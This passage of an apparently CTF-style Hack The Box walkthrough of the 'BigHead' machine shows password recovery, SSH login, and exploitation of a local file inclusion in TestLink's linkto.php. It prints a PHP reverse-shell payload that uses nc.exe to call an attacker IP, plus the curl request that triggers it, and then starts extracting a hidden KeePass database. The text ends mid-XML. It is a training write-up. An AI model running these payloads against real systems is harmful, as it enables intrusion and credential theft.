&lt;h4 id=&quot;passwordhash--336d72676e6333205361797a205472794861726465722e2e2e203b440a&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PasswordHash&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;336d72676e6333205361797a205472794861726465722e2e2e203b440a&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;looks-like-hex-lets-see-authenticate-&quot;&gt;Looks like &lt;code class=&quot;highlighter-rouge&quot;&gt;hex&lt;/code&gt;, Let’s see &lt;code class=&quot;highlighter-rouge&quot;&gt;Authenticate&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/107.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-output-was-kinda-weird-thats-because-of-the-null-bytes-i-removed-them-then-i-got-the-right-output-&quot;&gt;The output was kinda weird, that’s because of the null bytes, I removed them then I got the right output :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;4837334270555932557139552d5975677974354659556259302d553837743837&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/108.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-this-might-be-a-password--h73bpuy2uq9u-yugyt5fyuby0-u87t87-lets-check-passwordhash-&quot;&gt;So this might be a password : &lt;code class=&quot;highlighter-rouge&quot;&gt;H73BpUY2Uq9U-Yugyt5FYUbY0-U87t87&lt;/code&gt;, Let’s check &lt;code class=&quot;highlighter-rouge&quot;&gt;PasswordHash&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/109.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;3mrgnc3-sayz-tryharder-d-it-was-just-a-troll-anyway-we-have-a-password-lets-try-to-login-to-ssh-as-nignx-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;3mrgnc3 sayz TryHarder... ;D&lt;/code&gt;, It was just a troll. Anyway we have a password let’s try to login to ssh as &lt;code class=&quot;highlighter-rouge&quot;&gt;nignx&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/110.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-worked-and-by-looking-at-the-files-i-figured-out-that-we-are-in-cxampp-&quot;&gt;It worked, and by looking at the files I figured out that we are in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\xampp&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/111.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;there-was-also-a-usertxt-i-tried-to-read-it-but-it-said-that-it-was-a-binary-file-&quot;&gt;There was also a &lt;code class=&quot;highlighter-rouge&quot;&gt;user.txt&lt;/code&gt;, I tried to read it but it said that it was a binary file :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/112.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-wanted-to-check-the-user-but-whoami-wasnt-there-&quot;&gt;I wanted to check the user but &lt;code class=&quot;highlighter-rouge&quot;&gt;whoami&lt;/code&gt; wasn’t there :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/113.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-checked-help-and-this-shell-has-only-some-basic-commands-&quot;&gt;So I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;help&lt;/code&gt; and this shell has only some basic commands :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/114.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-know-that-im-inside-cxampp-now-but-what-am-i-searching-for-anyway--i-went-back-to-the-meterpreter-shell-and-checked-the-access-log-of-nginx-in-cnginxlogs-&quot;&gt;I know that I’m inside &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\xampp&lt;/code&gt; now. But what am I searching for anyway ? I went back to the &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; shell and checked the access log of &lt;code class=&quot;highlighter-rouge&quot;&gt;nginx&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\nginx\logs&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/115.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;at-the-beginning-of-the-log-i-found-some-requests-with-the-user-agent-3mrgnc3-&quot;&gt;At the beginning of the log I found some requests with the &lt;code class=&quot;highlighter-rouge&quot;&gt;user-agent&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;3mrgnc3&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/116.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;most-of-them-are-head-requests-maybe-he-was-testing-the-buffer-overflow-i-dont-really-know-but-anyway-we-are-not-looking-for-that-we-are-looking-for-requests-to-testlink-because-everything-we-have-access-to-on-port-5080-is-under-testlink&quot;&gt;Most of them are HEAD requests, maybe he was testing the buffer overflow I don’t really know but anyway we are not looking for that. We are looking for requests to &lt;code class=&quot;highlighter-rouge&quot;&gt;/testlink&lt;/code&gt;. Because everything we have access to on port 5080 is under &lt;code class=&quot;highlighter-rouge&quot;&gt;/testlink&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;on-the-7th-of-october-2018-at-021716-and-021806-i-found-two-post-requests-to-testlinklinktophp-&quot;&gt;On the 7th of October 2018 at 02:17:16 and 02:18:06 I found two POST requests to &lt;code class=&quot;highlighter-rouge&quot;&gt;/testlink/linkto.php&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/117.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-went-to-that-path-and-got-an-error-which-disclosed-the-path-of-the-php-file-&quot;&gt;I went to that path and got an error which disclosed the path of the &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; file :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/118.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Fatal error: require_once(): Failed opening required '' (include_path='C:\xampp\php\PEAR;.;C:\xampp\apps\testlink\htdocs\lib\functions\;C:\xampp\apps\testlink\htdocs\lib\issuetrackerintegration\;C:\xampp\apps\testlink\htdocs\lib\codetrackerintegration\;C:\xampp\apps\testlink\htdocs\lib\reqmgrsystemintegration\;C:\xampp\apps\testlink\htdocs\third_party\') in C:\xampp\apps\testlink\htdocs\linkto.php on line 62
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;the-path-was-cxamppappstestlinkhtdocslinktophp-so-i-went-there-and-got-the-php-file-&quot;&gt;The path was &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\xampp\apps\testlink\htdocs\linkto.php&lt;/code&gt; So I went there and got the &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; file :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/119.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/120.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;lfi-in-linktophp-user-flag&quot;&gt;LFI in &lt;code class=&quot;highlighter-rouge&quot;&gt;linkto.php&lt;/code&gt;, User Flag&lt;/h3&gt;
&lt;h4 id=&quot;its-a-long-script-so-i-will-just-focus-on-the-vulnerable-part-first-thing-i-noticed-was-this-comment-&quot;&gt;It’s a long script so I will just focus on the vulnerable part. First thing I noticed was this comment :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/121.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-checked-pipercoinphp-&quot;&gt;So I checked &lt;code class=&quot;highlighter-rouge&quot;&gt;pipercoin.php&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/122.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;pipercoinphp-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;pipercoin.php&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;!--                                                                                                                                        
TODO.. I just added a workaround to the linkto script for now.                                                                              
Nelson.                                                                                                                                     
--&amp;gt;                                                                                                                                         
&amp;lt;?php                                                                                                                                       
echo('PiperCoinAuth');                                                                                                                      
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;nothing-interesting-lets-go-back-to-linktophp&quot;&gt;Nothing interesting, Let’s go back to &lt;code class=&quot;highlighter-rouge&quot;&gt;linkto.php&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;i-noticed-here-that-we-can-send-a-post-request-with-the-parameters-piperid-and-pipercoinid-&quot;&gt;I noticed here that we can send a POST request with the parameters &lt;code class=&quot;highlighter-rouge&quot;&gt;PiperID&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;PiperCoinID&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(isset($_POST['PiperID'])){$PiperCoinAuth = $_POST['PiperCoinID']; //plugins/ppiper/pipercoin.php                                         
        $PiperCoinSess = base64_decode($PiperCoinAuth);                                                                                     
        $PiperCoinAvitar = (string)$PiperCoinSess;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;piperid-is-not-important-but-pipercoinid-is-its-taking-the-value-of-pipercoinid-and-assigning-it-to-another-variable-called-pipercoinauth-after-that-its-calling-require_once-with-pipercoinauth&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PiperID&lt;/code&gt; is not important but &lt;code class=&quot;highlighter-rouge&quot;&gt;PiperCoinID&lt;/code&gt; is. It’s taking the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;PiperCoinID&lt;/code&gt; and assigning it to another variable called &lt;code class=&quot;highlighter-rouge&quot;&gt;$PiperCoinAuth&lt;/code&gt;. After that it’s calling &lt;a href=&quot;https://www.php.net/manual/en/function.require-once.php&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;require_once()&lt;/code&gt;&lt;/a&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;$PiperCoinAuth&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/123.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-vulnerability-here-is-obvious-if-we-can-control-whats-in-require_once-then-we-can-make-it-include-any-php-file-of-our-choice-local-file-inclusion&quot;&gt;The vulnerability here is obvious. If we can control what’s in &lt;code class=&quot;highlighter-rouge&quot;&gt;require_once()&lt;/code&gt; Then we can make it include any &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; file of our choice (Local File Inclusion).&lt;/h4&gt;
&lt;h4 id=&quot;i-created-a-simple-php-script-to-execute-ncexe-and-give-me-a-reverse-shell-&quot;&gt;I created a simple &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; script to execute &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; and give me a reverse shell :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/124.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php
system('C:\Users\Nelson\AppData\Local\Temp\nc.exe -e cmd.exe 10.10.xx.xx 1339');
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-uploaded-it-and-uploaded-ncexe-to-cusersnelsonappdatalocaltemp-&quot;&gt;I uploaded it and uploaded &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\Nelson\AppData\Local\Temp\&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/125.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;last-step-is-to-exploit-the-vulnerability-we-will-send-a-post-request-to-httpcodebigheadhtbtestlinklinktophp-with-the-parameters-piperid-we-can-leave-it-empty-and-pipercoinid-which-will-be-the-path-of-the-php-script-cusersnelsonappdatalocaltemprevphp-&quot;&gt;Last step is to exploit the vulnerability. We will send a POST request to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://code.bighead.htb/testlink/linkto.php&lt;/code&gt; With the parameters &lt;code class=&quot;highlighter-rouge&quot;&gt;PiperID&lt;/code&gt; (we can leave it empty) and &lt;code class=&quot;highlighter-rouge&quot;&gt;PiperCoinID&lt;/code&gt; which will be the path of the &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; script (&lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\Nelson\AppData\Local\Temp\rev.php&lt;/code&gt;) :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;curl -X POST &quot;http://code.bighead.htb/testlink/linkto.php&quot; -d &quot;PiperID=&amp;amp;PiperCoinID=C:\Users\Nelson\AppData\Local\Temp\rev.php&quot;&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/126.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-get-a-reverse-shell-immediately-as-nt-authoritysystem-&quot;&gt;We get a reverse shell immediately. As &lt;code class=&quot;highlighter-rouge&quot;&gt;nt authority\system&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/127.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;awesome-now-we-can-get-root-and-user-flags-right--well--no-lets-get-the-user-flag-first-&quot;&gt;Awesome now we can get root and user flags, right ? well … no. Let’s get the user flag first :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/128.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user-&quot;&gt;We owned user !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;alternate-data-stream-in-roottxt&quot;&gt;Alternate Data Stream in &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt;&lt;/h3&gt;
&lt;h4 id=&quot;technically-we-own-root-now-but-we-still-need-to-do-some-more-stuff-to-get-the-root-flag&quot;&gt;Technically we own root now. But we still need to do some more stuff to get the root flag.&lt;/h4&gt;
&lt;h4 id=&quot;i-looked-in-cusersadministratordesktop-and-the-root-flag-wasnt-there&quot;&gt;I looked in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\Administrator\Desktop&lt;/code&gt; and the root flag wasn’t there.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/129.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-thought-it-might-be-hidden-so-i-tried-to-read-it-anyway-and-yes-it-was-hidden-but-&quot;&gt;I thought it might be hidden, so I tried to read it anyway and yes it was hidden. but …&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/130.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;gilfoyles-prayer-another-silicon-valley-reference-i-terminated-the-meterpreter-session-i-had-as-nelson-then-i-went-to-cusersnelsonappdatalocaltemp-and-executed-mexe-to-get-another-meterpreter-session-as-nt-authoritysystem-after-that-i-uploaded-streamsexe-to-check-for-alternate-data-streams-on-roottxt-&quot;&gt;Gilfoyle’s Prayer? Another “Silicon Valley” reference. I terminated the &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; session I had as &lt;code class=&quot;highlighter-rouge&quot;&gt;Nelson&lt;/code&gt; then I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\Nelson\AppData\Local\Temp&lt;/code&gt; and executed &lt;code class=&quot;highlighter-rouge&quot;&gt;m.exe&lt;/code&gt; to get another &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; session as &lt;code class=&quot;highlighter-rouge&quot;&gt;nt authority\system&lt;/code&gt;. After that I uploaded &lt;code class=&quot;highlighter-rouge&quot;&gt;streams.exe&lt;/code&gt; to check for alternate data streams on root.txt :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/131.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/132.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/133.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;streams C:\Users\Administrator\Desktop\root.txt&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/bighead/134.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;there-is-an-alternate-stream-called-zoneidentifier-i-tried-to-read-it-but-type-and-more-didnt-work-for-some-reason&quot;&gt;There is an alternate stream called &lt;code class=&quot;highlighter-rouge&quot;&gt;Zone.Identifier&lt;/code&gt;, I tried to read it but &lt;code class=&quot;highlighter-rouge&quot;&gt;type&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;more&lt;/code&gt; didn’t work for some reason.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/135.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/136.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-reading-this-article-i-did-it-like-this--more--cusersadministratordesktoproottxtzoneidentifier-and-saved-the-output-to-a-file-and-named-it-test&quot;&gt;After reading &lt;a href=&quot;https://www.howtogeek.com/howto/windows-vista/stupid-geek-tricks-hide-data-in-a-secret-text-file-compartment/&quot;&gt;this article&lt;/a&gt; I did it like this : &lt;code class=&quot;highlighter-rouge&quot;&gt;more &amp;lt; &quot;C:\Users\Administrator\Desktop\root.txt:Zone.Identifier&quot;&lt;/code&gt; and saved the output to a file and named it &lt;code class=&quot;highlighter-rouge&quot;&gt;test&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/137.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/138.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;when-i-looked-at-test-i-found-that-it-was-a-binary-file-&quot;&gt;When I looked at &lt;code class=&quot;highlighter-rouge&quot;&gt;test&lt;/code&gt; I found that it was a binary file :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/139.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-i-downloaded-it-to-use-file-against-it-&quot;&gt;So I downloaded it to use &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; against it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/140.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/141.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;keepass-password-database&quot;&gt;Keepass password database&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;cracking-the-database-root-flag&quot;&gt;Cracking the Database, Root Flag&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;KeePass Password Safe is a free and open-source password manager primarily for Windows. It officially supports macOS and Linux operating systems through the use of Mono. Additionally, there are several unofficial ports for Windows Phone, Android, iOS, and BlackBerry devices. -&lt;a href=&quot;https://en.wikipedia.org/wiki/KeePass&quot;&gt;Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&quot;i-renamed-the-file-to-testkdbx-&quot;&gt;I renamed the file to &lt;code class=&quot;highlighter-rouge&quot;&gt;test.kdbx&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/142.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-i-used-keepass2-to-open-it-&quot;&gt;Then I used &lt;code class=&quot;highlighter-rouge&quot;&gt;keepass2&lt;/code&gt; to open it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/143.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/144.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-of-course-we-need-a-password-and-a-key-i-went-back-to-the-shell-and-checked-the-configuration-file-for-keepass-in-cusersadministratorappdataroamingkeepass&quot;&gt;And of course we need a password and a key. I went back to the shell and checked the configuration file for &lt;code class=&quot;highlighter-rouge&quot;&gt;keepass&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Users\Administrator\AppData\Roaming\KeePass&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/bighead/145.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/bighead/146.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;keepassconfigxml-&quot;&gt;KeePass.config.xml :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;Configuration&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:xsi=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;xmlns:xsd=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://www.w3.org/2001/XMLSchema&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;Meta&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;PreferUserConfiguration&amp;gt;&lt;/span&gt;false&lt;span class=&quot;nt&quot;&gt;&amp;lt;/PreferUserConfiguration&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;OmitItemsWithDefaultValues&amp;gt;&lt;/span&gt;true&lt;span class=&quot;nt&quot;&gt;&amp;lt;/OmitItemsWithDefaultValues&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;DpiFactorX&amp;gt;&lt;/span&gt;1&lt;span class=&quot;nt&quot;&gt;&amp;lt;/DpiFactorX&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;DpiFactorY&amp;gt;&lt;/span&gt;1&lt;span class=&quot;nt&quot;&gt;&amp;lt;/DpiFactorY&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Meta&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;Application&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;LastUsedFile&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Path&amp;gt;&lt;/span&gt;..\..\Users\Administrator\Desktop\root.txt:Zone.Identifier&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Path&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;CredProtMode&amp;gt;&lt;/span&gt;Obf&lt;span class=&quot;nt&quot;&gt;&amp;lt;/CredProtMode&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;CredSaveMode&amp;gt;&lt;/span&gt;NoSave&lt;span class=&quot;nt&quot;&gt;&amp;lt;/CredSaveMode&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/LastUsedFile&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;MostRecentlyUsed&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;MaxItemCount&amp;gt;&lt;/span&gt;12&lt;span class=&quot;nt&quot;&gt;&amp;lt;/MaxItemCount&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Items&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;ConnectionInfo&amp;gt;&lt;/span&gt;
					&lt;span class=&quot;nt&quot;&gt;&amp;lt;Path&amp;gt;&lt;/span&gt;..\..\Users\Administrator\Desktop\chest.kdbx&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Path&amp;gt;&lt;/span&gt;
					&lt;span class=&quot;nt&quot;&gt;&amp;lt;CredProtMode&amp;gt;&lt;/span&gt;Obf&lt;span class=&quot;nt&quot;&gt;&amp;lt;/CredProtMode&amp;gt;&lt;/span&gt;
					&lt;span class=&quot;nt&quot;&gt;&amp;lt;CredSaveMode&amp;gt;&lt;/span&gt;NoSave&lt;span class=&quot;nt&quot;&gt;&amp;lt;/CredSaveMode&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;/ConnectionInfo&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Items&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/MostRecentlyUsed&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;WorkingDirectories&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Item&amp;gt;&lt;/span&gt;Database@..\..\Users\Administrator\Desktop&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Item&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Item&amp;gt;&lt;/span&gt;KeyFile@..\..\Users\Administrator\Desktop&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Item&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/WorkingDirectories&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;Start&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;CheckForUpdate&amp;gt;&lt;/span&gt;false&lt;span class=&quot;nt&quot;&gt;&amp;lt;/CheckForUpdate&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;CheckForUpdateConfigured&amp;gt;&lt;/span&gt;true&lt;span class=&quot;nt&quot;&gt;&amp;lt;/CheckForUpdateConfigured&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Start&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;FileOpening&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;FileClosing&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;TriggerSystem&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;Triggers&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
